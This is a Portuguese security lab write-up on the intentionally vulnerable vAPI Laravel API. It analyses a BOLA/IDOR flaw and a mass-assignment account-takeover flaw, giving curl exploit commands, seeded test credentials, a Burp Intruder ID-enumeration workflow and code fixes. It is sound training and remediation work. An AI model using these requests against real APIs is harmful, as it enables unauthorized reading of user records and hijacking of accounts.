# Parte 1 — Análise de Segurança da API (vAPI)

Alvo: [roottusk/vapi](https://github.com/roottusk/vapi) — **API1** (`/api/api1/user/*`), uma API Laravel
que simula um sistema de cadastro de alunos (usuário, nome, curso, senha).

## Como subir o ambiente

O vAPI é distribuído com Docker Compose (forma oficial e recomendada pelos mantenedores):

```bash
git clone https://github.com/roottusk/vapi.git
cd vapi
docker-compose up -d
# API sobe em http://localhost:80/api/...
```

Após subir, confira que a API responde:

```bash
curl -i http://localhost/api/api1/user/1
# Esperado: 403 {"success":"false","cause":"authHeaderNotSet"}
```

## Endpoints escolhidos

| # | Método | Endpoint                | Controller/Função                                         |
|---|--------|--------------------------|-------------------------------------------------------------|
| 1 | GET    | `/api/api1/user/{id}`   | `API1UsersController@show`   (routes/api.php:30)             |
| 2 | PUT    | `/api/api1/user/{id}`   | `API1UsersController@update` (routes/api.php:32)             |

Ambos ficam em `app/Http/Controllers/API1UsersController.php`.

## Autenticação usada pela API1

A API1 usa um esquema de autenticação "caseiro" via header `Authorization-Token`,
implementado em `app/CustomClasses/CustomHeaderAuth.php`:

```php
function __construct($headerstr){
    $this->headerstr = base64_decode($headerstr);
    $this->authstring = explode(":", $this->headerstr);
    $this->username = $this->authstring[0];
    $this->password = $this->authstring[1];
}
```

Ou seja: o cliente manda `Authorization-Token: base64(usuario:senha)` — equivalente a
HTTP Basic Auth "artesanal", em texto claro dentro do Base64 (sem hash, sem salt).
As credenciais de teste (seed `database/vapi.sql`) são:

| id | username   | password        | course (sensível)                          |
|----|------------|-----------------|---------------------------------------------|
| 1  | michaels   | `60!eH>Rt=d'-`  | `flag{api1_d0cd9be2324cc237235b}`           |
| 2  | meredithp  | `[NaZ7RUMbK#O`  | The Subtle art of not giving a F***          |
| 3  | pambeese   | `/&T=_yEA5,_L`  | Sketching for Dummies                        |
| 4  | jimhalp    | `` ag4|YY~`M=Gk``| Art of Pranks                               |

---

## Vulnerabilidade 1 — Broken Object Level Authorization (API1:2023)
### Endpoint: `GET /api/api1/user/{id}`

### Por que a falha ocorre

`app/Http/Controllers/API1UsersController.php`, método `show` (linhas 13–34):

```php
13:    public function show(Request $request,$id)
14:    {
15:        if($request->hasHeader('Authorization-Token') && $request->header('Authorization-Token')!="" )
16:        {
17:            $user = new CustomHeaderAuth($request->header('Authorization-Token'));
18:            $validuser = API1Users::where('username',$user->getUsername())->where('password',$user->getPassword())->count();
19:
20:            if($validuser>0)
21:            {
22:                return API1Users::find($id);          // <-- VULNERÁVEL
23:            }
```

A linha 18 apenas confirma que o par usuário/senha enviado **existe na tabela**
(ou seja, autentica *alguém*). A linha 22 então busca o registro pelo `$id` da
**URL**, sem nunca comparar esse `$id` com o id do usuário autenticado na
linha 18. Isso é o padrão clássico de **BOLA/IDOR**: a aplicação prova "quem é
você", mas nunca checa "você tem permissão sobre *este* objeto".

Como os IDs são inteiros sequenciais (1, 2, 3, 4…), um atacante autenticado
com **qualquer** credencial válida consegue enumerar e ler o perfil de
**qualquer outro usuário**, incluindo o campo `course`, onde está a flag do
usuário 1.

### Exploração

Passo a passo manual (curl):

```bash
# Credenciais válidas de QUALQUER usuário, ex. jimhalp (id=4)
TOKEN=$(echo -n "jimhalp:ag4|YY~\`M=Gk" | base64)

# Usando a própria conta (esperado) -> funciona
curl -s http://localhost/api/api1/user/4 -H "Authorization-Token: $TOKEN"

# BOLA: usando o MESMO token para ler o perfil do usuário 1 (michaels)
curl -s http://localhost/api/api1/user/1 -H "Authorization-Token: $TOKEN"
# -> Retorna os dados de michaels, incluindo a flag em "course"
```

Script automatizado: [`poc_bola_get_user.py`](./poc_bola_get_user.py) — autentica
como `jimhalp` e enumera os ids 1 a 10, mostrando todos os perfis vazados.

### Correção proposta

1. **Checar posse do objeto, não só identidade**: comparar o `id` autenticado
   com o `$id` da rota antes de retornar o registro:
   ```php
   $authUser = API1Users::where('username', $user->getUsername())
                   ->where('password', $user->getPassword())
                   ->first();
   if (!$authUser || (int) $authUser->id !== (int) $id) {
       return response()->json(['success' => false, 'cause' => 'forbidden'], 403);
   }
   return $authUser;
   ```
2. Migrar a autenticação "caseira" (Base64 de usuário:senha em texto puro) para
   **Laravel Sanctum/Passport** com tokens opacos e expiração — já presente nas
   dependências do projeto (`laravel/sanctum`) mas não usado nesta API.
3. Fazer *hash* das senhas (`bcrypt`) — hoje estão em texto claro na base.
4. Adicionar *rate limiting* nas rotas de API para dificultar enumeração em massa.

---

## Vulnerabilidade 2 — BOLA + Mass Assignment → Account Takeover
### (API1:2023 Broken Object Level Authorization + API3:2023 Broken Object Property Level Authorization)
### Endpoint: `PUT /api/api1/user/{id}`

### Por que a falha ocorre

Mesmo arquivo, método `update` (linhas 52–77):

```php
52:    public function update(Request $request, $id)
53:    {
54:        if($request->hasHeader('Authorization-Token') && $request->header('Authorization-Token')!="" )
55:        {
56:            $user = new CustomHeaderAuth($request->header('Authorization-Token'));
57:            $validuser = API1Users::where('username',$user->getUsername())->where('password',$user->getPassword())->count();
58:
59:            if($validuser>0)
60:            {
61:                $user = API1Users::findorFail($id);        // <-- BOLA: $id vem da URL
62:                $user->update($request->all());            // <-- MASS ASSIGNMENT: todos os campos do body
63:
64:                return $user;
65:            }
```

Dois problemas empilhados na mesma falha:

* **BOLA (linha 61)**: exatamente igual à vulnerabilidade 1 — qualquer
  credencial válida autoriza update em **qualquer** `$id`, não apenas no
  próprio.
* **Mass Assignment (linha 62)**: `$request->all()` repassa **todo** o corpo
  JSON enviado direto para `update()`. O model permite isso porque declara
  (`app/Models/API1Users.php`):
  ```php
  protected $fillable = ['username','name','course','password'];
  ```
  Ou seja, o campo `password` é "fillable" e pode ser sobrescrito livremente
  via PUT — inclusive o de outro usuário, por conta do BOLA acima.

**Impacto**: um atacante com uma conta de teste válida qualquer consegue
**trocar a senha de qualquer outro usuário** (ex.: `michaels`, id 1),
realizando sequestro de conta (account takeover) completo — sem precisar
nunca saber a senha original da vítima.

### Exploração

```bash
TOKEN=$(echo -n "jimhalp:ag4|YY~\`M=Gk" | base64)

# Atacante (jimhalp) sobrescreve a senha do usuário 1 (michaels)
curl -s -X PUT http://localhost/api/api1/user/1 \
  -H "Authorization-Token: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"password":"pwned123"}'

# Prova de account takeover: login agora funciona com a nova senha do usuário 1
NEWTOKEN=$(echo -n "michaels:pwned123" | base64)
curl -s http://localhost/api/api1/user/1 -H "Authorization-Token: $NEWTOKEN"
```

Script automatizado: [`poc_account_takeover_put.py`](./poc_account_takeover_put.py)
— autentica como `jimhalp`, sobrescreve a senha do usuário 1 e confirma o
login com a nova senha, provando o takeover de ponta a ponta.

### Correção proposta

1. Mesma checagem de posse do objeto da Vulnerabilidade 1 antes do `update`.
2. **Nunca usar `$request->all()` em `update()`/`create()`**. Usar
   *allow-list* explícita por operação, nunca o `$fillable` do model inteiro:
   ```php
   $user->update($request->validate([
       'name'   => 'sometimes|string|max:255',
       'course' => 'sometimes|string|max:255',
       // "password" só deveria ser alterável em endpoint dedicado,
       // com senha atual + confirmação, nunca em PUT genérico de perfil
   ]));
   ```
3. Se o troca-de-senha precisa existir, criar endpoint próprio
   (`PUT /api1/user/{id}/password`) exigindo a senha atual (ou reautenticação)
   e aplicando hash (`bcrypt`) antes de salvar.
4. Logar/alertar tentativas de update em `id` diferente do autenticado
   (indício de ataque automatizado/BOLA scanning).

---

## Bônus — Postman + Burp Suite

Fluxo recomendado para descoberta manual dessas falhas:

1. Importar a collection oficial do vAPI (`postman/`, no repositório) no
   Postman e configurar o Postman para usar o Burp como proxy upstream
   (`Settings → Proxy → Add a custom proxy configuration → 127.0.0.1:8080`).
2. No Burp, deixar o **Proxy** interceptando e disparar as requisições a
   partir do Postman — toda requisição passa a aparecer no **Proxy History**
   e pode ser enviada ao **Repeater**.
3. No Repeater, pegar uma requisição válida de `GET /api1/user/4` (autenticado
   como `jimhalp`) e simplesmente **trocar o `4` por `1`, `2`, `3`...** no
   path — o Burp facilita esse tipo de teste iterativo de BOLA sem reescrever
   comandos curl a cada tentativa.
4. Usar o **Intruder** do Burp com um payload numérico (`1`–`100`) no
   lugar do `{id}` para automatizar a enumeração de BOLA em escala e
   comparar tamanhos/códigos de resposta (indica quais ids existem).
5. A combinação funciona bem porque o **Postman** mantém as coleções
   organizadas e reaproveitáveis (fácil de rodar o fluxo de login → pegar
   token → chamar endpoint), enquanto o **Burp** dá visibilidade total do
   tráfego bruto e ferramentas de manipulação/automação (Repeater, Intruder,
   Decoder — útil aqui para decodificar/recodificar o `Authorization-Token`
   em Base64 na hora).
